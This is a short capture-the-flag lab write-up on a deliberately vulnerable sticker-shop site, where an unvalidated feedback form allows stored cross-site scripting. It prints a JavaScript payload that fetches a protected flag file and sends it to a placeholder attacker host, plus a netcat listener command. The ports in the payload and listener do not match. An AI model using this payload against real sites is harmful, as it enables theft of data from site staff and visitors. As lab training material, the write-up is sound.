
---
- Lab objective and difficulty level  
- **Step-by-step exploitation methodology**  
- **Payloads that worked** (and ones that didn't)  
- **Request/response samples** (screenshots or raw text)  
- **Why** the vulnerability existed and how to fix it
---
# # Lab objective and difficulty level

```
Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

Can you read the flag at http://10.48.186.49:8080/flag.txt?
```

---
# Step-by-step exploitation methodology

```
- This lab is vulnerable to client side exploitation. 

- So after visiting the site we can see that there are 2 pages - Home and feedback

- There is no vulnerability in home page after fuzzing here and there didnt found anything even after manual and automation 

- So i Moved on feedback page here we can see a feedback form and it stores our input but there is no validation here so i tried stored XSS attack 
  
- Also there is one more directory Which says 401 authorized and here is the flag stored.
```

![[Pasted image 20261008013632.png]]

![[Pasted image 20261008013959.png]]

![[Pasted image 20261008014422.png]]

```
- So wrote a js script using chatgpt 
  
<script>  
fetch('/flag.txt')  
.then(r => r.text())  
.then(d => {  
new Image().src = 'http://<your-ip>:1234/log?flag=' + encodeURIComponent(d);  
});  
</script>

- This helps to fetch the flag because we are unauthorized.

- So i started netcat - nc -lvnp 1324

- and i got the url encoded flag and hence we solved it
```

